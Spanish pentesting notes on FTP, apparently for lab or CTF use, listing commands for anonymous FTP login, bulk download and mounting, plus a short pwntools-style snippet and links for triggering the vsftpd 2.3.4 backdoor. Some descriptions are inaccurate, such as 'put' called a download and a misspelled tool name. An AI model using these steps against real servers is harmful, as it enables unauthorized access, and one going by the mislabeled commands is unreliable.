** Anonymous ftp login allowed **
Conexión directa con la herramienta ftp
>`ftp 10.10.10.20`
>Introducir usuario --> anonymous
>Introducir contraseña en blanco
>Listar los recursos una vez entrado al servicio
>`dir`

Descargar de forma recursiva a través del servicio ftp los recursos que contenga
>`wget ftp://anonymous:loquesea@10.10.10.20`

Descargar un archivo una vez logueados en el sistema
>`put file.txt`

Descargar todos los archivos del servicio FTP
>`prompt off`
>`mget *`

Montura sobre servicio FTP con curlftps
Crea una montura sobre el directorio actual ($(pwd)) al servicio FTP
>`which curlftps`			// /urs/bin/curlftps
>`curlftps anonymous:loquesea@10.10.10.78 $(pwd)`

Uso de la utilidad mirror con curl para el servicio FTP
Se obtienen los recursos, -m = mirror, utilidad espejo.
>`wget -m ftp://anonymous:loquesea@10.10.10.78`

==================================================================

** vsftpd-2.3.4 **
https://github.com/ahervias77/vsftpd-2.3.4-exploit
https://github.com/Hellsender01/vsftpd_2.3.4_Exploit

Vulnerabilidad principal en vsftpd-2.3.4:
```
vsftpd.sendline('USER hii:)')

vsftpd.sendline('PASS hello')

p.status('Backdoor Activated')

```

Esta versión tiene un backdoor incorporado que se activa cuando se le pasan ciertos comandos. 
